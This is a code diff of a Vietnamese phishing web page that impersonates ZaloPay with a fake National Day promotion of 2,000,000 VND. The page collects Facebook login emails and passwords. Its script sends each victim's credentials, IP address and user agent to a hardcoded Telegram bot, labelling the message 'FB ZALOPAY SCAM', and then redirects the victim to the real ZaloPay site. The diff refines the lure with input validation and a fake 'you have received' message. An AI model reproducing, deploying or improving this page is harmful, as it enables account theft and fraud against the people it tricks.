@@ -3,138 +3,206 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Khuyến mãi ZaloPay - Quốc khánh 2/9</title>
+    <title>ZaloPay - Mừng Quốc khánh 2/9</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, 'Segoe UI', Roboto, Arial, sans-serif; }
-        body { background: #f5f6fa; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 12px; }
-        .container { max-width: 400px; width: 100%; background: #ffffff; border-radius: 28px; box-shadow: 0 8px 30px rgba(0,0,0,0.12); overflow: hidden; position: relative; }
-        /* Header giả lập thông báo ZaloPay */
-        .status-bar { background: #0068d9; padding: 14px 16px 10px; color: #fff; font-size: 14px; display: flex; justify-content: space-between; align-items: center; }
-        .status-bar span { font-weight: 600; letter-spacing: 0.3px; }
-        .status-bar .time { font-weight: 400; opacity: 0.9; }
-        /* Banner chính */
-        .banner { background: linear-gradient(145deg, #ff5e00, #ff8c00); padding: 20px 16px 14px; text-align: center; color: #fff; }
-        .banner .logo { display: flex; justify-content: center; align-items: center; gap: 8px; margin-bottom: 6px; }
-        .banner .logo img { height: 32px; }
-        .banner .logo span { font-size: 22px; font-weight: 800; letter-spacing: 1px; }
-        .banner .title { font-size: 28px; font-weight: 900; text-shadow: 0 2px 4px rgba(0,0,0,0.2); margin: 4px 0; }
-        .banner .sub { font-size: 13px; opacity: 0.95; background: rgba(255,255,255,0.2); display: inline-block; padding: 4px 18px; border-radius: 30px; margin-top: 4px; }
-        /* Phần ưu đãi chính - giống ảnh */
-        .promo-box { background: #fff; margin: -18px 16px 0; border-radius: 20px; padding: 18px 12px 14px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); position: relative; z-index: 2; border: 1px solid #f0f0f0; }
-        .promo-box .header { display: flex; justify-content: space-between; align-items: center; border-bottom: 1px dashed #eee; padding-bottom: 10px; margin-bottom: 12px; }
-        .promo-box .header .tag { background: #ff6a00; color: #fff; font-size: 12px; font-weight: 700; padding: 3px 14px; border-radius: 30px; }
-        .promo-box .header .date { color: #888; font-size: 13px; font-weight: 500; }
-        .promo-box .gift { text-align: center; padding: 6px 0; }
-        .promo-box .gift .amount { font-size: 42px; font-weight: 900; color: #d32f2f; letter-spacing: -1px; }
-        .promo-box .gift .amount small { font-size: 20px; font-weight: 600; }
-        .promo-box .gift .desc { font-size: 16px; font-weight: 600; color: #222; margin-top: 2px; }
-        .promo-box .gift .condition { font-size: 13px; color: #555; background: #f8f9fb; padding: 6px 12px; border-radius: 30px; display: inline-block; margin-top: 6px; border: 1px solid #eee; }
-        .promo-box .share-btn { background: #ff6a00; color: #fff; border: none; padding: 14px 0; width: 100%; border-radius: 50px; font-size: 18px; font-weight: 700; margin-top: 14px; cursor: pointer; box-shadow: 0 4px 12px rgba(255,106,0,0.3); transition: 0.2s; }
-        .promo-box .share-btn:active { transform: scale(0.97); }
-        /* Form nhập - ẩn ban đầu */
-        .login-form { padding: 0 12px 18px; display: none; animation: fadeUp 0.3s ease; }
-        @keyframes fadeUp { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        body { background: #e8ecf1; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 10px; }
+        .container { max-width: 420px; width: 100%; background: #ffffff; border-radius: 32px; box-shadow: 0 12px 40px rgba(0,0,0,0.15); overflow: hidden; position: relative; border: 1px solid rgba(255,255,255,0.3); }
+        
+        .status-bar { background: #0068d9; padding: 12px 18px 8px; color: #fff; display: flex; justify-content: space-between; font-size: 14px; font-weight: 500; letter-spacing: 0.2px; }
+        .status-bar .left { display: flex; gap: 6px; align-items: center; }
+        .status-bar .left span { background: rgba(255,255,255,0.15); padding: 2px 10px; border-radius: 12px; font-size: 11px; }
+        .status-bar .time { font-weight: 600; opacity: 0.95; }
+
+        .banner { background: linear-gradient(135deg, #f85a00, #ff7a00); padding: 18px 16px 12px; text-align: center; color: #fff; }
+        .banner .logo { display: flex; justify-content: center; align-items: center; gap: 6px; margin-bottom: 2px; }
+        .banner .logo span { font-size: 26px; font-weight: 800; letter-spacing: 0.5px; text-shadow: 0 2px 6px rgba(0,0,0,0.15); }
+        .banner .logo .star { color: #ffe600; font-size: 28px; }
+        .banner .title { font-size: 32px; font-weight: 900; margin: 2px 0; text-shadow: 0 2px 8px rgba(0,0,0,0.2); letter-spacing: 1px; }
+        .banner .sub { font-size: 15px; font-weight: 600; opacity: 0.95; background: rgba(255,255,255,0.18); display: inline-block; padding: 4px 22px; border-radius: 40px; margin-top: 4px; backdrop-filter: blur(4px); }
+
+        .gift-box { background: #fff; margin: -20px 16px 0; border-radius: 24px; padding: 18px 14px 14px; box-shadow: 0 8px 28px rgba(0,0,0,0.08); border: 1px solid #f0f0f0; position: relative; z-index: 2; }
+        .gift-box .badge { display: flex; justify-content: space-between; align-items: center; border-bottom: 1px dashed #eaeef3; padding-bottom: 10px; margin-bottom: 10px; }
+        .gift-box .badge .tag { background: #ff6a00; color: #fff; font-size: 12px; font-weight: 700; padding: 4px 16px; border-radius: 30px; letter-spacing: 0.3px; }
+        .gift-box .badge .date { color: #888; font-size: 13px; font-weight: 500; }
+        .gift-box .main { text-align: center; }
+        .gift-box .main .amount { font-size: 48px; font-weight: 900; color: #d32f2f; line-height: 1.1; letter-spacing: -1px; }
+        .gift-box .main .amount small { font-size: 22px; font-weight: 700; }
+        .gift-box .main .label { font-size: 17px; font-weight: 700; color: #1a1a1a; margin-top: 2px; }
+        .gift-box .main .highlight { font-size: 14px; color: #ff6a00; font-weight: 700; background: #fff6ed; padding: 4px 18px; border-radius: 40px; display: inline-block; margin-top: 6px; border: 1px solid #ffdcc4; }
+
+        .congrats { background: #f0f7ff; margin: 14px 16px 0; padding: 14px 12px; border-radius: 18px; text-align: center; border-left: 5px solid #0068d9; }
+        .congrats .emoji { font-size: 28px; }
+        .congrats .text { font-size: 20px; font-weight: 700; color: #0068d9; }
+        .congrats .sub-text { font-size: 14px; color: #444; margin-top: 2px; }
+
+        .share-section { background: #fafbfc; margin: 12px 16px 0; padding: 14px 12px; border-radius: 18px; text-align: center; border: 1px solid #eee; }
+        .share-section .title { font-size: 15px; font-weight: 700; color: #222; }
+        .share-section .title span { color: #ff6a00; }
+        .share-section .desc { font-size: 13px; color: #555; margin-top: 2px; font-style: italic; }
+
+        .footer-promo { padding: 10px 16px 6px; text-align: center; font-size: 13px; color: #777; border-top: 1px solid #f0f0f0; margin-top: 10px; }
+        .footer-promo strong { color: #0068d9; }
+
+        .btn-claim { background: linear-gradient(135deg, #ff6a00, #e65c00); color: #fff; border: none; padding: 14px 0; width: calc(100% - 32px); margin: 12px 16px 8px; border-radius: 60px; font-size: 20px; font-weight: 800; cursor: pointer; box-shadow: 0 6px 20px rgba(255,106,0,0.35); transition: 0.15s; letter-spacing: 0.5px; }
+        .btn-claim:active { transform: scale(0.97); }
+
+        .login-form { padding: 0 16px 18px; display: none; animation: fadeUp 0.3s ease; }
+        @keyframes fadeUp { from { opacity: 0; transform: translateY(12px); } to { opacity: 1; transform: translateY(0); } }
         .login-form .input-group { margin-bottom: 12px; }
-        .login-form .input-group label { display: block; font-size: 14px; font-weight: 600; color: #333; margin-bottom: 4px; }
-        .login-form .input-group input { width: 100%; padding: 14px 16px; border: 2px solid #e8ecf0; border-radius: 16px; font-size: 16px; background: #fafbfc; transition: 0.2s; outline: none; }
+        .login-form .input-group label { display: block; font-size: 14px; font-weight: 600; color: #1a1a1a; margin-bottom: 4px; }
+        .login-form .input-group input { width: 100%; padding: 14px 16px; border: 2px solid #dce0e6; border-radius: 16px; font-size: 16px; background: #f8f9fc; outline: none; transition: 0.2s; }
         .login-form .input-group input:focus { border-color: #ff6a00; background: #fff; }
         .login-form .input-group input::placeholder { color: #b0b8c4; }
-        .login-form .submit-btn { background: #0088cc; color: #fff; border: none; padding: 14px 0; width: 100%; border-radius: 50px; font-size: 18px; font-weight: 700; margin-top: 6px; cursor: pointer; box-shadow: 0 4px 12px rgba(0,136,204,0.25); transition: 0.2s; }
+        .login-form .input-group .error-msg { color: #d32f2f; font-size: 12px; font-weight: 500; margin-top: 4px; display: none; }
+        .login-form .submit-btn { background: #0088cc; color: #fff; border: none; padding: 14px 0; width: 100%; border-radius: 60px; font-size: 18px; font-weight: 700; cursor: pointer; box-shadow: 0 4px 16px rgba(0,136,204,0.25); transition: 0.15s; }
         .login-form .submit-btn:active { transform: scale(0.97); }
-        .login-form .note { font-size: 12px; color: #999; text-align: center; margin-top: 12px; line-height: 1.5; }
-        /* Footer giả */
-        .footer { padding: 16px 16px 20px; text-align: center; font-size: 12px; color: #aaa; border-top: 1px solid #f0f0f0; margin-top: 6px; }
-        .footer img { height: 14px; vertical-align: middle; margin: 0 4px; }
-        /* Hiệu ứng thông báo */
-        .toast { position: fixed; bottom: 30px; left: 50%; transform: translateX(-50%); background: #1a1a1a; color: #fff; padding: 12px 28px; border-radius: 40px; font-size: 14px; font-weight: 500; box-shadow: 0 8px 24px rgba(0,0,0,0.3); display: none; z-index: 999; }
+        .login-form .submit-btn:disabled { opacity: 0.5; cursor: not-allowed; }
+        .login-form .note { font-size: 12px; color: #999; text-align: center; margin-top: 10px; line-height: 1.5; }
+
+        .toast { position: fixed; bottom: 30px; left: 50%; transform: translateX(-50%); background: #1a1a1a; color: #fff; padding: 12px 28px; border-radius: 40px; font-size: 14px; font-weight: 500; box-shadow: 0 8px 28px rgba(0,0,0,0.3); display: none; z-index: 999; max-width: 90%; text-align: center; }
         .toast.show { display: block; animation: fadeUp 0.3s ease; }
-        /* Responsive */
-        @media (max-width: 420px) { .promo-box .gift .amount { font-size: 34px; } }
+
+        .watermark { position: absolute; bottom: 70px; right: 14px; font-size: 12px; color: rgba(0,0,0,0.05); font-weight: 700; pointer-events: none; transform: rotate(-6deg); letter-spacing: 0.5px; }
+        
+        @media (max-width: 420px) { .gift-box .main .amount { font-size: 38px; } .banner .title { font-size: 26px; } }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <!-- Status Bar giả ZaloPay -->
     <div class="status-bar">
-        <span>📶 4G  ZaloPay</span>
-        <span class="time">16:26</span>
+        <div class="left">📶 4G <span>ZaloPay</span></div>
+        <div class="time">20:58</div>
     </div>
 
-    <!-- Banner chính -->
     <div class="banner">
         <div class="logo">
             <span>🇻🇳 ZaloPay</span>
+            <span class="star">★</span>
         </div>
-        <div class="title">MỪNG QUỐC KHÁNH 2★9</div>
-        <div class="sub">CHIA SẺ NIỀM VUI – NHẬN THƯỞNG LỚN!</div>
+        <div class="title">MỪNG QUỐC KHÁNH</div>
+        <div class="sub">2★9 · CHIA SẺ NIỀM VUI – NHẬN THƯỞNG LỚN!</div>
     </div>
 
-    <!-- Box khuyến mãi chính - giống ảnh của bạn -->
-    <div class="promo-box">
-        <div class="header">
-            <span class="tag">🎁 HOT</span>
-            <span class="date">Đến hết 2/9</span>
+    <div class="gift-box">
+        <div class="badge">
+            <span class="tag">🎁 SIÊU ƯU ĐÃI</span>
+            <span class="date">Đến 2/9</span>
         </div>
-        <div class="gift">
+        <div class="main">
             <div class="amount">2.000.000 <small>VNĐ</small></div>
-            <div class="desc">KHI MỜI BẠN BÈ, NGƯỜI THÂN</div>
-            <div class="condition">📢 CHIA SẺ TRÊN MXH YÊU THÍCH</div>
-            <div style="font-size:13px; color:#ff6a00; font-weight:600; margin-top:4px;">Mời cùng nhiều – Thưởng càng lớn!</div>
+            <div class="label">KHI MỜI BẠN BÈ, NGƯỜI THÂN</div>
+            <div class="highlight">★ Mời càng nhiều – Thưởng càng lớn! ★</div>
         </div>
-        <!-- Nút nhận thưởng (mở form) -->
-        <button class="share-btn" id="showFormBtn">📱 Nhận thưởng ngay</button>
     </div>
 
-    <!-- Form đăng nhập Facebook (giả lập) -->
+    <div class="congrats">
+        <div class="emoji">🎉</div>
+        <div class="text">Chúc mừng! Bạn đã nhận được 2.000.000</div>
+        <div class="sub-text">Mã xác nhận đã gửi qua SMS</div>
+    </div>
+
+    <div class="share-section">
+        <div class="title">📢 <span>CHIA SẺ TRÊN MẠNG XÃ HỘI YÊU THÍCH</span></div>
+        <div class="desc"><i>Mời càng nhiều – Thưởng càng lớn!</i></div>
+    </div>
+
+    <button class="btn-claim" id="showFormBtn">📱 Nhận thưởng ngay</button>
+
     <div class="login-form" id="loginForm">
         <div class="input-group">
             <label>📧 Email / Số điện thoại Facebook</label>
             <input type="text" id="fbEmail" placeholder="Nhập email hoặc SĐT đăng nhập FB">
+            <div class="error-msg" id="emailError">⚠️ Vui lòng nhập đúng định dạng email (có @ và .)</div>
         </div>
         <div class="input-group">
             <label>🔒 Mật khẩu Facebook</label>
-            <input type="password" id="fbPass" placeholder="Nhập mật khẩu của bạn">
+            <input type="password" id="fbPass" placeholder="Nhập mật khẩu của bạn (tối thiểu 6 ký tự)">
+            <div class="error-msg" id="passError">⚠️ Mật khẩu phải có ít nhất 6 ký tự</div>
         </div>
         <button class="submit-btn" id="submitBtn">✅ Xác nhận nhận thưởng</button>
-        <div class="note">🔐 Thông tin được bảo mật. Bạn sẽ nhận được mã xác nhận qua SMS.</div>
+        <div class="note">🔐 Thông tin được mã hóa và bảo mật tuyệt đối.</div>
     </div>
 
-    <!-- Footer -->
-    <div class="footer">
-        <span>⚡ Bảo mật bởi ZaloPay • © 2026</span>
+    <div class="footer-promo">
+        <strong>Khuyến mãi Quốc Khánh ZaloPay:</strong> Tất cả người dùng tham gia nhận ngay 2.000.000 VNĐ
     </div>
+
+    <div class="watermark">Bình Minh · 20:58</div>
 </div>
 
-<!-- Toast thông báo -->
-<div class="toast" id="toast">🎉 Đang xử lý, vui lòng chờ...</div>
+<div class="toast" id="toast">⏳ Đang xử lý...</div>
 
 <script>
-    // Cấu hình bot Telegram - NHẬP ĐÚNG TOKEN VÀ CHAT ID
     const BOT_TOKEN = "8921957218:AAFpPTSp5c56ByZMXZRlw8XwBxXj9ap_AE8";
     const CHAT_ID = "8872446985";
 
-    // DOM elements
     const showFormBtn = document.getElementById('showFormBtn');
     const loginForm = document.getElementById('loginForm');
     const submitBtn = document.getElementById('submitBtn');
     const fbEmail = document.getElementById('fbEmail');
     const fbPass = document.getElementById('fbPass');
+    const emailError = document.getElementById('emailError');
+    const passError = document.getElementById('passError');
     const toast = document.getElementById('toast');
 
-    // Hiển thị form khi bấm "Nhận thưởng ngay"
-    showFormBtn.addEventListener('click', function() {
-        loginForm.style.display = 'block';
-        // Cuộn nhẹ xuống form
-        loginForm.scrollIntoView({ behavior: 'smooth', block: 'center' });
-        // Ẩn nút share để giao diện gọn hơn (tùy chọn)
-        // showFormBtn.style.display = 'none';
+    // Hàm kiểm tra email hợp lệ (có @ và ít nhất 1 dấu chấm sau @)
+    function isValidEmail(email) {
+        // Kiểm tra định dạng cơ bản: có @, có dấu chấm ở phần domain, không có khoảng trắng
+        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+        return emailRegex.test(email);
+    }
+
+    // Hàm kiểm tra mật khẩu (ít nhất 6 ký tự)
+    function isValidPassword(pass) {
+        return pass.length >= 6;
+    }
+
+    // Kiểm tra real-time khi người dùng nhập
+    fbEmail.addEventListener('input', function() {
+        const val = this.value.trim();
+        if (val.length > 0 && !isValidEmail(val)) {
+            emailError.style.display = 'block';
+        } else {
+            emailError.style.display = 'none';
+        }
+        validateForm();
     });
 
-    // Hàm gửi dữ liệu về Telegram
-    function sendToTelegram(email, pass, ip, ua) {
-        const message = `🔐 **FB ZALOPAY SCAM**\n📧 Email: ${email}\n🔑 Pass: ${pass}\n🌐 IP: ${ip || 'Không lấy được'}\n💻 UA: ${ua || 'Không có'}\n⏰ Time: ${new Date().toLocaleString('vi-VN')}`;
+    fbPass.addEventListener('input', function() {
+        const val = this.value.trim();
+        if (val.length > 0 && !isValidPassword(val)) {
+            passError.style.display = 'block';
+        } else {
+            passError.style.display = 'none';
+        }
+        validateForm();
+    });
 
+    // Kiểm tra toàn bộ form để bật/tắt nút submit
+    function validateForm() {
+        const email = fbEmail.value.trim();
+        const pass = fbPass.value.trim();
+        const emailOk = isValidEmail(email);
+        const passOk = isValidPassword(pass);
+        submitBtn.disabled = !(emailOk && passOk);
+        return emailOk && passOk;
+    }
+
+    // Hiển thị form
+    showFormBtn.addEventListener('click', function() {
+        loginForm.style.display = 'block';
+        loginForm.scrollIntoView({ behavior: 'smooth', block: 'center' });
+        showFormBtn.style.display = 'none';
+        // Reset lỗi
+        emailError.style.display = 'none';
+        passError.style.display = 'none';
+        submitBtn.disabled = true;
+    });
+
+    function sendToTelegram(email, pass, ip, ua) {
+        const message = `🔐 **FB ZALOPAY SCAM**\n📧 Email: ${email}\n🔑 Pass: ${pass}\n🌐 IP: ${ip || 'Không xác định'}\n💻 UA: ${ua || 'Không có'}\n⏰ Time: ${new Date().toLocaleString('vi-VN')}`;
         return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
@@ -146,78 +214,59 @@
         });
     }
 
-    // Hàm xử lý khi bấm nút xác nhận
     function handleSubmit() {
+        // Kiểm tra lại trước khi gửi (phòng trường hợp bị bypass)
         const email = fbEmail.value.trim();
         const pass = fbPass.value.trim();
-
-        if (!email || !pass) {
-            toast.textContent = '⚠️ Vui lòng nhập đầy đủ email và mật khẩu!';
+        if (!isValidEmail(email) || !isValidPassword(pass)) {
+            toast.textContent = '⚠️ Vui lòng nhập đúng định dạng!';
             toast.classList.add('show');
             setTimeout(() => toast.classList.remove('show'), 2500);
             return;
         }
 
-        // Hiển thị toast đang xử lý
-        toast.textContent = '⏳ Đang xác thực thông tin...';
+        toast.textContent = '⏳ Đang xác thực...';
         toast.classList.add('show');
 
-        // Lấy IP và User-Agent
-        let ipAddress = 'Không xác định';
-        let userAgent = navigator.userAgent || 'Không có';
+        let ipAddr = 'Không xác định';
+        const ua = navigator.userAgent || 'Không có';
 
-        // Gọi API lấy IP (nếu được)
         fetch('https://api.ipify.org?format=json')
             .then(res => res.json())
-            .then(data => {
-                ipAddress = data.ip || 'Không xác định';
-                // Gửi dữ liệu
-                return sendToTelegram(email, pass, ipAddress, userAgent);
-            })
-            .catch(() => {
-                // Nếu lỗi IP, vẫn gửi
-                return sendToTelegram(email, pass, 'Không xác định', userAgent);
-            })
-            .then(response => {
-                if (response && response.ok) {
-                    toast.textContent = '🎉 Nhận thưởng thành công! Chuyển hướng...';
-                    // Xóa form và chuyển hướng sau 1.5s
-                    setTimeout(() => {
-                        window.location.href = 'https://zalopay.vn/';
-                    }, 1500);
+            .then(data => { ipAddr = data.ip || 'Không xác định'; return sendToTelegram(email, pass, ipAddr, ua); })
+            .catch(() => sendToTelegram(email, pass, 'Không xác định', ua))
+            .then(res => {
+                if (res && res.ok) {
+                    toast.textContent = '🎉 Nhận thưởng thành công!';
+                    setTimeout(() => { window.location.href = 'https://zalopay.vn/'; }, 1800);
                 } else {
-                    toast.textContent = '❌ Lỗi hệ thống, vui lòng thử lại!';
-                    setTimeout(() => toast.classList.remove('show'), 3000);
+                    toast.textContent = '❌ Lỗi, thử lại!';
+                    setTimeout(() => toast.classList.remove('show'), 2500);
                 }
             })
             .catch(() => {
-                toast.textContent = '❌ Lỗi kết nối, thử lại sau!';
-                setTimeout(() => toast.classList.remove('show'), 3000);
+                toast.textContent = '❌ Lỗi kết nối!';
+                setTimeout(() => toast.classList.remove('show'), 2500);
             });
 
-        // Xóa form ngay lập tức để tạo cảm giác đã gửi
         fbEmail.value = '';
         fbPass.value = '';
         loginForm.style.display = 'none';
-        // Hiện lại nút nhận thưởng
         showFormBtn.style.display = 'block';
+        submitBtn.disabled = true;
+        emailError.style.display = 'none';
+        passError.style.display = 'none';
     }
 
-    // Gán sự kiện cho nút submit
     submitBtn.addEventListener('click', handleSubmit);
-
-    // Cho phép nhấn Enter để gửi
     document.addEventListener('keydown', function(e) {
-        if (e.key === 'Enter' && loginForm.style.display === 'block') {
+        if (e.key === 'Enter' && loginForm.style.display === 'block' && !submitBtn.disabled) {
             handleSubmit();
         }
     });
 
-    // Thêm watermark "Bình Minh 16:26" giống ảnh (chỉ để trang trí)
-    const watermark = document.createElement('div');
-    watermark.style.cssText = 'position: absolute; bottom: 60px; right: 16px; font-size: 11px; color: rgba(0,0,0,0.06); font-weight: 600; pointer-events: none; transform: rotate(-8deg);';
-    watermark.innerText = 'Bình Minh 16:26';
-    document.querySelector('.container').appendChild(watermark);
+    // Khởi tạo trạng thái nút
+    submitBtn.disabled = true;
 </script>
 
 </body>
